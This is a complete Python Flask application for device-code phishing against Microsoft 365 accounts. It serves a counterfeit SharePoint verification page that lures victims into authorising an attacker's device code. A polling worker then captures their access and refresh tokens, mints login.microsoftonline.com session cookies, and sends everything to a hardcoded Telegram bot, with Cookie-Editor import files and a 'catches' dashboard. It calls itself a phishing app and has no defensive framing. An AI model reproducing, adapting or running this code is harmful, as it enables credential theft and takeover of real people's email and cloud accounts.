import os
import json
import time
import base64
import uuid
import sqlite3
import threading
import signal
import requests
from flask import Flask, request, Response

UPSTREAM = "https://login.microsoftonline.com"
TELEGRAM_TOKEN = "8998925422:AAFKDgRkGsFewhlRC6tDmrGa33a6yNxj9UY"
TELEGRAM_CHAT = "8877118461"
DB_PATH = "/tmp/phish.db"

CLIENT_IDS = [
    "1950a258-227b-4e31-a9cf-717495945fc2",  # Azure PowerShell
    "04b07795-8ddb-461a-bbee-02f9e1bf7b46",  # Azure CLI
    "d3590ed6-52b3-4102-aeff-aad2292ab01c",  # Microsoft Office
]
CLIENT_ID_INDEX = 0

# IMPORTANT: Outlook resource ONLY. No graph.microsoft.com — mixing resources causes AADSTS65002.
DEVICE_CODE_SCOPE = "offline_access https://outlook.office.com/IMAP.AccessAsUser.All https://outlook.office.com/SMTP.Send"

COOKIE_WANTED = [
    "ESTSAUTH", "ESTSAUTHPERSISTENT", "ESTSAUTHLIGHT", "ESTSAUTHTCT",
    "SignInStateCookie", "x-ms-gateway-suitename", "ESTSAUTHHPERSISTENT",
    "brcap", "fpc", "esctx", "cltm", "x-ms-cpim-sso",
]

app = Flask(__name__)
shutdown_event = threading.Event()

# ---------- DB ----------
def init_db():
    con = sqlite3.connect(DB_PATH)
    con.execute("""CREATE TABLE IF NOT EXISTS sessions (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        device_code TEXT,
        user_code TEXT,
        client_id TEXT,
        interval INTEGER,
        expires_at REAL,
        status TEXT,
        email TEXT,
        tokens TEXT,
        cookies TEXT,
        ts TEXT
    )""")
    cols = [r[1] for r in con.execute("PRAGMA table_info(sessions)").fetchall()]
    if "cookies" not in cols:
        con.execute("ALTER TABLE sessions ADD COLUMN cookies TEXT")
    con.commit()
    con.close()

init_db()

def db_add_session(device_code, user_code, client_id, interval, expires_at):
    con = sqlite3.connect(DB_PATH)
    con.execute("INSERT INTO sessions (device_code, user_code, client_id, interval, expires_at, status, ts) VALUES (?,?,?,?,?,?,?)",
                (device_code, user_code, client_id, interval, expires_at, "pending",
                 time.strftime("%Y-%m-%d %H:%M:%S")))
    sid = con.execute("SELECT last_insert_rowid()").fetchone()[0]
    con.commit()
    con.close()
    return sid

def db_pending_sessions():
    con = sqlite3.connect(DB_PATH)
    rows = con.execute("SELECT id, device_code, client_id, interval, expires_at FROM sessions WHERE status='pending'").fetchall()
    con.close()
    return rows

def db_update_session(sid, **kw):
    con = sqlite3.connect(DB_PATH)
    for k, v in kw.items():
        con.execute(f"UPDATE sessions SET {k}=? WHERE id=?", (v, sid))
    con.commit()
    con.close()

# ---------- Telegram ----------
def send_telegram(text):
    try:
        while len(text) > 4000:
            chunk = text[:4000]
            cut = chunk.rfind("\n")
            if cut > 500:
                chunk = text[:cut]
            requests.post(
                f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
                data={"chat_id": TELEGRAM_CHAT, "text": chunk},
                timeout=15
            )
            text = text[len(chunk):].lstrip("\n")
        if text:
            requests.post(
                f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
                data={"chat_id": TELEGRAM_CHAT, "text": text},
                timeout=15
            )
    except Exception as e:
        print("Telegram error:", e)

def send_telegram_file(filename, content, caption=""):
    try:
        files = {"document": (filename, content.encode())}
        requests.post(
            f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument",
            data={"chat_id": TELEGRAM_CHAT, "caption": caption},
            files=files,
            timeout=30
        )
    except Exception as e:
        print("Telegram file error:", e)

# ---------- Device code flow ----------
def request_device_code():
    global CLIENT_ID_INDEX
    for _ in range(len(CLIENT_IDS)):
        client_id = CLIENT_IDS[CLIENT_ID_INDEX]
        try:
            resp = requests.post(
                f"{UPSTREAM}/common/oauth2/v2.0/devicecode",
                data={"client_id": client_id, "scope": DEVICE_CODE_SCOPE},
                timeout=20
            )
            data = resp.json()
            if resp.status_code == 200 and "device_code" in data:
                return client_id, data
            else:
                print(f"[SESSION] client_id {client_id} failed: {data.get('error', resp.status_code)}")
                CLIENT_ID_INDEX = (CLIENT_ID_INDEX + 1) % len(CLIENT_IDS)
        except Exception as e:
            print(f"[SESSION] client_id {client_id} exception: {e}")
            CLIENT_ID_INDEX = (CLIENT_ID_INDEX + 1) % len(CLIENT_IDS)
    return None, None

def decode_id_token(id_token):
    try:
        payload = id_token.split(".")[1]
        payload += "=" * (-len(payload) % 4)
        data = json.loads(base64.urlsafe_b64decode(payload))
        return data.get("preferred_username") or data.get("email") or data.get("upn") or "unknown"
    except Exception:
        return "unknown"

# ---------- Cookie minting ----------
def get_victim_cookies(refresh_token, client_id, email):
    """Exchange refresh token, then hit /authorize so MS sets ESTSAUTH cookies."""
    try:
        s = requests.Session()
        s.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36"
        })
        # Step 1: refresh token -> new tokens (same client_id, same Outlook scope)
        r = s.post(
            f"{UPSTREAM}/common/oauth2/v2.0/token",
            data={
                "client_id": client_id,
                "grant_type": "refresh_token",
                "refresh_token": refresh_token,
                "scope": DEVICE_CODE_SCOPE,
            },
            timeout=25,
        )
        data = r.json()
        if "access_token" not in data:
            print("[COOKIES] refresh failed:", data.get("error"), data.get("error_description", "")[:200])
            return None

        # Step 2: SSO authorize round-trip so login.microsoftonline.com issues cookies
        nonce = uuid.uuid4().hex
        auth_url = (
            f"{UPSTREAM}/common/oauth2/authorize?"
            f"client_id={client_id}&response_type=id_token"
            f"&redirect_uri=https%3A%2F%2Flogin.microsoftonline.com%2Fcommon%2Foauth2%2Fnativeclient"
            f"&scope=openid&response_mode=form_post&nonce={nonce}"
            f"&login_hint={email}"
        )
        s.get(auth_url, timeout=25, allow_redirects=True)

        cookies = {}
        for c in s.cookies:
            if c.name in COOKIE_WANTED and c.value:
                cookies[c.name] = c.value
        if not cookies:
            print("[COOKIES] no wanted cookies captured")
            return None
        print(f"[COOKIES] captured {len(cookies)} cookies")
        return cookies
    except Exception as e:
        print(f"[COOKIES] exception: {e}")
        return None

def format_cookies_text(cookies, email):
    lines = [f" COOKIE SESSION - {email}", "Domain: login.microsoftonline.com", ""]
    for name, value in cookies.items():
        lines.append(f"{name}={value}")
    return "\n".join(lines)

def format_cookie_editor_json(cookies):
    out = []
    for name, value in cookies.items():
        out.append({
            "domain": "login.microsoftonline.com",
            "name": name,
            "path": "/",
            "value": value,
            "secure": True,
            "httpOnly": True,
            "sameSite": "no_restriction",
        })
    return json.dumps(out, indent=2)

# ---------- Worker ----------
def poll_worker():
    print("[WORKER] poll_worker started")
    while not shutdown_event.is_set():
        try:
            for sid, device_code, client_id, interval, expires_at in db_pending_sessions():
                if time.time() > expires_at:
                    db_update_session(sid, status="expired")
                    print(f"[WORKER] session {sid} expired")
                    continue
                try:
                    resp = requests.post(
                        f"{UPSTREAM}/common/oauth2/v2.0/token",
                        data={
                            "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
                            "client_id": client_id,
                            "device_code": device_code,
                        },
                        timeout=20
                    )
                    data = resp.json()
                except Exception as e:
                    print(f"[WORKER] poll error session {sid}: {e}")
                    continue

                if "access_token" in data:
                    email = decode_id_token(data.get("id_token", ""))
                    tokens = {
                        "access_token": data.get("access_token"),
                        "refresh_token": data.get("refresh_token"),
                        "id_token": data.get("id_token"),
                    }
                    cookies = get_victim_cookies(tokens["refresh_token"], client_id, email)
                    if cookies:
                        db_update_session(sid, status="caught", email=email,
                                          tokens=json.dumps(tokens), cookies=json.dumps(cookies))
                    else:
                        db_update_session(sid, status="caught", email=email,
                                          tokens=json.dumps(tokens), cookies="{}")

                    msg = (f"\U0001F3C6 New catch!\n"
                           f"Email: {email}\n"
                           f"Session: {sid}\n"
                           f"Access Token:\n{tokens['access_token']}\n\n"
                           f"Refresh Token:\n{tokens['refresh_token']}\n\n"
                           f"ID Token:\n{tokens['id_token']}")

                    if cookies:
                        msg += ("\n\n\u2705 SESSION COOKIES (domain login.microsoftonline.com):\n"
                                + format_cookies_text(cookies, email))
                        msg += ("\n\n\u2192 Paste into Cookie-Editor on login.microsoftonline.com, "
                                "then open outlook.office.com/mail")

                    if len(msg) > 4000:
                        send_telegram(f"\U0001F3C6 New catch! Email: {email} (tokens + cookies attached)")
                        send_telegram_file("tokens.txt", json.dumps(tokens, indent=2), f"Tokens for {email}")
                        if cookies:
                            send_telegram_file("cookies.json", format_cookie_editor_json(cookies),
                                               f"Cookie-Editor import for {email} -> login.microsoftonline.com")
                    else:
                        send_telegram(msg)
                        if cookies:
                            send_telegram_file("cookies.json", format_cookie_editor_json(cookies),
                                               f"Cookie-Editor import for {email} -> login.microsoftonline.com")

                    print(f"[WORKER] session {sid} caught email={email} cookies={'yes' if cookies else 'no'}")
                elif data.get("error") == "authorization_pending":
                    pass
                elif data.get("error") == "slow_down":
                    time.sleep(5)
                elif data.get("error") == "expired_token":
                    db_update_session(sid, status="expired")
                    print(f"[WORKER] session {sid} token expired")
                elif data.get("error") in ("authorization_declined", "invalid_grant"):
                    db_update_session(sid, status="declined")
                    print(f"[WORKER] session {sid} declined")
        except Exception as e:
            print(f"[WORKER] loop error: {e}")
        shutdown_event.wait(timeout=3)
    print("[WORKER] poll_worker stopped")

_worker_started = False
def start_worker():
    global _worker_started
    if not _worker_started:
        threading.Thread(target=poll_worker, daemon=True).start()
        _worker_started = True
        print("[WORKER] thread launched")

start_worker()

def _shutdown(sig, frame):
    shutdown_event.set()

signal.signal(signal.SIGTERM, _shutdown)
signal.signal(signal.SIGINT, _shutdown)

# ---------- Page (SharePoint style — unchanged) ----------
def render_page(user_code, verify_url):
    return f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>SharePoint - Verify Identity</title>
<style>
* {{ margin: 0; padding: 0; box-sizing: border-box; }}
body {{ font-family: 'Segoe UI', 'Segoe UI Web (West European)', -apple-system, BlinkMacSystemFont, Roboto, 'Helvetica Neue', sans-serif; background-color: #faf9f8; color: #201f1e; min-height: 100vh; line-height: 1.5; overflow-x: hidden; }}
.sp-header {{ background: linear-gradient(90deg, #0078d4 0%, #106ebe 100%); height: 48px; display: flex; align-items: center; padding: 0 24px; box-shadow: 0 2px 4px rgba(0,0,0,0.12); position: relative; z-index: 100; }}
.sp-logo {{ width: 32px; height: 32px; background: white; border-radius: 4px; display: flex; align-items: center; justify-content: center; font-weight: 700; font-size: 18px; color: #0078d4; margin-right: 12px; }}
.sp-title {{ color: white; font-size: 16px; font-weight: 600; letter-spacing: 0.2px; }}
.breadcrumb {{ background: white; padding: 12px 32px; border-bottom: 1px solid #edebe9; font-size: 14px; display: flex; align-items: center; gap: 8px; }}
.breadcrumb a {{ color: #0078d4; text-decoration: none; }}
.breadcrumb a:hover {{ text-decoration: underline; color: #106ebe; }}
.breadcrumb .sep {{ color: #a19f9d; margin: 0 2px; }}
.breadcrumb .current {{ color: #201f1e; font-weight: 600; }}
.main-container {{ max-width: 1100px; margin: 30px auto; padding: 0 20px; }}
.card {{ background: white; border-radius: 8px; box-shadow: 0 1.6px 3.6px 0 rgba(0,0,0,0.13), 0 0.3px 0.9px 0 rgba(0,0,0,0.11); overflow: hidden; border: 1px solid #e1dfdd; position: relative; min-height: 520px; }}
.doc-lib-bg {{ position: absolute; top: 0; left: 0; right: 0; bottom: 0; filter: blur(4px); opacity: 0.5; pointer-events: none; user-select: none; z-index: 1; overflow: hidden; }}
.sp-toolbar {{ display: flex; align-items: center; padding: 8px 16px; background: white; border-bottom: 1px solid #e1dfdd; gap: 8px; }}
.toolbar-btn {{ display: inline-flex; align-items: center; gap: 6px; padding: 6px 14px; border: 1px solid #8a8886; border-radius: 4px; font-size: 13px; font-weight: 600; color: #323130; background: white; }}
.toolbar-btn.primary {{ background: #0078d4; color: white; border-color: #0078d4; }}
.toolbar-btn svg {{ width: 14px; height: 14px; fill: currentColor; }}
.toolbar-divider {{ width: 1px; height: 24px; background: #d2d0ce; margin: 0 4px; }}
.toolbar-icon-btn {{ width: 32px; height: 32px; display: flex; align-items: center; justify-content: center; border-radius: 4px; color: #605e5c; }}
.toolbar-icon-btn svg {{ width: 16px; height: 16px; fill: currentColor; }}
.file-list-table {{ width: 100%; border-collapse: collapse; font-size: 13px; background: white; }}
.file-list-table th {{ background: #faf9f8; padding: 8px 12px; text-align: left; font-weight: 600; color: #323130; border-bottom: 1px solid #e1dfdd; font-size: 12px; }}
.file-list-table th:first-child {{ width: 40px; text-align: center; }}
.file-list-table td {{ padding: 10px 12px; border-bottom: 1px solid #edebe9; color: #323130; vertical-align: middle; }}
.file-icon-cell {{ display: flex; align-items: center; gap: 10px; }}
.file-type-icon {{ width: 24px; height: 24px; border-radius: 3px; display: flex; align-items: center; justify-content: center; font-size: 9px; font-weight: 700; color: white; flex-shrink: 0; }}
.icon-excel {{ background: #217346; }}
.icon-word {{ background: #2b579a; }}
.icon-ppt {{ background: #d24726; }}
.icon-pdf {{ background: #b30b00; }}
.icon-folder {{ background: #fce100; color: #323130; }}
.file-name-text {{ font-weight: 500; color: #0078d4; }}
.file-name-text.folder {{ color: #323130; font-weight: 600; }}
.modified-date, .modified-by {{ color: #605e5c; font-size: 12px; }}
.checkbox {{ width: 16px; height: 16px; border: 1px solid #8a8886; border-radius: 2px; display: inline-block; }}
.verify-overlay {{ position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 10; background: white; border-radius: 12px; box-shadow: 0 8px 32px rgba(0,0,0,0.18), 0 2px 8px rgba(0,0,0,0.08); padding: 48px 56px; text-align: center; max-width: 520px; width: 90%; border: 1px solid #e1dfdd; }}
.ms-brand-header {{ display: flex; align-items: center; justify-content: center; gap: 10px; margin-bottom: 24px; }}
.ms-grid-logo {{ display: grid; grid-template-columns: 1fr 1fr; gap: 2px; width: 24px; height: 24px; }}
.ms-grid-logo span:nth-child(1) {{ background: #f25022; }}
.ms-grid-logo span:nth-child(2) {{ background: #7fba00; }}
.ms-grid-logo span:nth-child(3) {{ background: #00a4ef; }}
.ms-grid-logo span:nth-child(4) {{ background: #ffb900; }}
.ms-text-logo {{ font-size: 24px; font-weight: 600; color: #737373; letter-spacing: -0.5px; }}
.verify-title {{ font-size: 26px; font-weight: 700; color: #1b1b1b; margin-bottom: 12px; line-height: 1.3; }}
.verify-subtitle {{ font-size: 16px; color: #1b1b1b; line-height: 1.5; margin-bottom: 28px; }}
.code-box {{ display: flex; align-items: center; justify-content: space-between; background: #f0f4f9; border: 1px solid #d1d9e6; border-radius: 6px; padding: 16px 24px; margin-bottom: 28px; }}
.code-text {{ font-size: 38px; font-weight: 700; color: #005a9e; letter-spacing: 4px; font-family: 'Segoe UI', sans-serif; }}
.copy-btn {{ display: flex; align-items: center; gap: 8px; background: none; border: none; color: #005a9e; font-size: 16px; font-weight: 600; cursor: pointer; padding: 8px; border-radius: 4px; transition: background 0.2s; }}
.copy-btn:hover {{ background: rgba(0, 90, 158, 0.1); }}
.copy-btn svg {{ width: 20px; height: 20px; fill: #005a9e; }}
.action-btn {{ display: flex; align-items: center; justify-content: center; gap: 10px; width: 100%; padding: 14px 24px; background: #005a9e; color: white; border: none; border-radius: 4px; font-size: 16px; font-weight: 600; cursor: pointer; text-decoration: none; transition: background 0.2s; }}
.action-btn:hover {{ background: #004578; }}
.action-btn svg {{ width: 18px; height: 18px; fill: white; }}
.footer {{ text-align: center; padding: 24px; font-size: 12px; color: #a19f9d; }}
.footer a {{ color: #0078d4; text-decoration: none; }}
.footer a:hover {{ text-decoration: underline; }}
@media (max-width: 640px) {{ .main-container {{ margin: 20px auto; padding: 0 12px; }} .verify-overlay {{ padding: 32px 24px; }} .verify-title {{ font-size: 22px; }} .code-text {{ font-size: 28px; letter-spacing: 2px; }} .breadcrumb {{ padding: 10px 16px; font-size: 13px; }} }}
</style>
</head>
<body>
<header class="sp-header">
    <div class="sp-logo">S</div>
    <span class="sp-title">SharePoint</span>
</header>
<nav class="breadcrumb">
    <a href="#">Home</a><span class="sep">›</span><a href="#">Documents</a><span class="sep">›</span><span class="current">Shared-Document.xlsx</span>
</nav>
<div class="main-container">
    <div class="card">
        <div class="doc-lib-bg">
            <div class="sp-toolbar">
                <button class="toolbar-btn primary"><svg viewBox="0 0 24 24"><path d="M19 13h-6v6h-2v-6H5v-2h6V5h2v6h6v2z"/></svg>New</button>
                <button class="toolbar-btn"><svg viewBox="0 0 24 24"><path d="M9 16h6v-6h4l-7-7-7 7h4v6zm-4 2h14v2H5v-2z"/></svg>Upload</button>
                <div class="toolbar-divider"></div>
                <button class="toolbar-btn"><svg viewBox="0 0 24 24"><path d="M17 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V7l-4-4zm-5 16c-1.66 0-3-1.34-3-3s1.34-3 3-3 3 1.34 3 3-1.34 3-3 3zm3-10H5V5h10v4z"/></svg>Sync</button>
                <button class="toolbar-btn"><svg viewBox="0 0 24 24"><path d="M12 8c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2zm0 2c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2zm0 6c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2z"/></svg>Automate</button>
                <div class="toolbar-divider"></div>
                <div class="toolbar-icon-btn"><svg viewBox="0 0 24 24"><path d="M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/></svg></div>
                <div style="flex:1;"></div>
                <div class="toolbar-icon-btn"><svg viewBox="0 0 24 24"><path d="M3 18h6v-2H3v2zM3 6v2h18V6H3zm0 7h12v-2H3v2z"/></svg></div>
            </div>
            <table class="file-list-table">
                <thead><tr><th><span class="checkbox"></span></th><th>Name</th><th>Modified</th><th>Modified By</th><th>File Size</th></tr></thead>
                <tbody>
                    <tr><td><span class="checkbox"></span></td><td><div class="file-icon-cell"><div class="file-type-icon icon-folder">📁</div><span class="file-name-text folder">Project Documents</span></div></td><td class="modified-date">Nov 10, 2026</td><td class="modified-by">J. Smith</td><td class="modified-date">—</td></tr>
                    <tr><td><span class="checkbox"></span></td><td><div class="file-icon-cell"><div class="file-type-icon icon-excel">X</div><span class="file-name-text">Q4_Budget_2026.xlsx</span></div></td><td class="modified-date">Nov 10, 2026</td><td class="modified-by">A. Lee</td><td class="modified-date">245 KB</td></tr>
                    <tr><td><span class="checkbox"></span></td><td><div class="file-icon-cell"><div class="file-type-icon icon-word">W</div><span class="file-name-text">Meeting_Notes_Nov.docx</span></div></td><td class="modified-date">Nov 9, 2026</td><td class="modified-by">K. West</td><td class="modified-date">89 KB</td></tr>
                    <tr><td><span class="checkbox"></span></td><td><div class="file-icon-cell"><div class="file-type-icon icon-ppt">P</div><span class="file-name-text">Strategy_Presentation.pptx</span></div></td><td class="modified-date">Nov 7, 2026</td><td class="modified-by">T. Brown</td><td class="modified-date">3.2 MB</td></tr>
                    <tr><td><span class="checkbox"></span></td><td><div class="file-icon-cell"><div class="file-type-icon icon-pdf">PDF</div><span class="file-name-text">Contract_Agreement.pdf</span></div></td><td class="modified-date">Nov 5, 2026</td><td class="modified-by">R. Garcia</td><td class="modified-date">1.1 MB</td></tr>
                </tbody>
            </table>
        </div>
        <div class="verify-overlay">
            <div class="ms-brand-header">
                <div class="ms-grid-logo"><span></span><span></span><span></span><span></span></div>
                <span class="ms-text-logo">Microsoft</span>
            </div>
            <h1 class="verify-title">Copy and paste this code to authenticate</h1>
            <p class="verify-subtitle">To continue, copy the code below and paste it on Microsoft's verification page.</p>
            <div class="code-box">
                <span class="code-text">{user_code}</span>
                <button class="copy-btn" onclick="go()"><svg viewBox="0 0 24 24"><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"/></svg>Copy</button>
            </div>
            <a href="#" class="action-btn" onclick="go(); return false;">
                <svg viewBox="0 0 24 24"><path d="M19 19H5V5h7V3H5c-1.11 0-2 .9-2 2v14c0 1.1.89 2 2 2h14c1.1 0 2-.9 2-2v-7h-2v7zM14 3v2h3.59l-9.83 9.83 1.41 1.41L19 6.41V10h2V3h-7z"/></svg>
                Go to microsoft.com/devicelogin
            </a>
        </div>
    </div>
</div>
<footer class="footer">© 2026 Microsoft Corporation · <a href="#">Privacy</a> · <a href="#">Terms of Use</a> · <a href="#">Trademarks</a></footer>
<script>
function go() {{
  navigator.clipboard.writeText("{user_code}").catch(function(){{}});
  setTimeout(function(){{ window.location.href = "{verify_url}"; }}, 250);
}}
</script>
</body>
</html>"""

# ---------- Routes ----------
@app.route("/", methods=["GET"])
def home():
    client_id, data = request_device_code()
    if not data:
        return "<h2>Service temporarily unavailable, please retry.</h2>", 503
    sid = db_add_session(
        data["device_code"], data["user_code"], client_id,
        data.get("interval", 5), time.time() + int(data.get("expires_in", 900))
    )
    print(f"[SESSION] new session {sid} user_code={data['user_code']}")
    return Response(render_page(data["user_code"], data["verification_uri"]), mimetype="text/html")

@app.route("/test_tg", methods=["GET"])
def test_tg():
    send_telegram("✅ Test message from your phishing app - Telegram works!")
    return "Telegram test sent - check your DMs."

@app.route("/catches", methods=["GET"])
def catches():
    con = sqlite3.connect(DB_PATH)
    rows = con.execute(
        "SELECT id, email, tokens, cookies, ts FROM sessions WHERE status='caught' ORDER BY id DESC LIMIT 20"
    ).fetchall()
    con.close()

    html = """<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>Catches</title>
<style>
body { font-family: 'Segoe UI', sans-serif; background: #faf9f8; padding: 24px; }
h1 { color: #0078d4; }
.card { background: white; border: 1px solid #e1dfdd; border-radius: 8px; padding: 16px; margin-bottom: 16px; box-shadow: 0 1.6px 3.6px rgba(0,0,0,0.13); }
.email { font-weight: 700; color: #005a9e; font-size: 16px; }
.ts { color: #a19f9d; font-size: 12px; }
pre { background: #f3f2f1; padding: 10px; border-radius: 4px; font-size: 11px; white-space: pre-wrap; word-break: break-all; }
details { margin: 6px 0; }
summary { cursor: pointer; font-weight: 600; color: #323130; }
</style></head><body>
<h1>Caught Sessions (last 20)</h1>"""

    if not rows:
        html += "<p>No catches yet.</p>"

    for sid, email, tokens, cookies, ts in rows:
        html += f'<div class="card"><div class="email">#{sid} — {email}</div>'
        html += f'<div class="ts">{ts}</div>'
        try:
            t = json.loads(tokens or "{}")
            html += '<details><summary>Access Token</summary><pre>'
            html += (t.get("access_token") or "none") + '</pre></details>'
            html += '<details><summary>Refresh Token</summary><pre>'
            html += (t.get("refresh_token") or "none") + '</pre></details>'
            html += '<details><summary>ID Token</summary><pre>'
            html += (t.get("id_token") or "none") + '</pre></details>'
        except Exception:
            html += "<p>Token parse error</p>"
        try:
            c = json.loads(cookies or "{}")
            if c:
                cookie_str = "; ".join(f"{k}={v}" for k, v in c.items())
                html += f'<details><summary>Cookies ({len(c)})</summary><pre>{cookie_str}</pre></details>'
        except Exception:
            pass
        html += "</div>"

    html += "</body></html>"
    return Response(html, mimetype="text/html")


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
